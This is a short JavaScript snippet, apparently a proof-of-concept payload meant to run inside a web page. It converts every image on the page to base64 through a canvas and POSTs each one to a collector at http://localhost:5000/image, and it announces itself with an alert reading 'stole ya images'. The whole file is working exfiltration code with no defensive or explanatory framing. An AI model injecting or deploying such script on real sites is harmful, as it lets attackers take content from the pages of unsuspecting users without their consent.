function tobase64(image, outputFormat){
    var canvas = document.createElement("canvas");
    document.body.appendChild(canvas);

    canvas.width  = image.width;
    canvas.height = image.height;

    var context = canvas.getContext("2d");

    context.drawImage(image, 0, 0);
    datau = canvas.toDataURL(outputFormat)
    console.log('RESULT:', datau)
    return datau
}

async function postData(url = '', data = {}) {
    const response = await fetch(url, {
        method: 'POST',
        mode: 'cors',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)   
    });

    return await response.json();
}

alert("stole ya images");
var images = document.images;
alert(images.length)

Array.prototype.forEach.call(images, image => {
    postData('http://localhost:5000/image', {"image": tobase64(image), "hello":"nothin"})
        .then((data) => {
            console.log(data);
}); 
})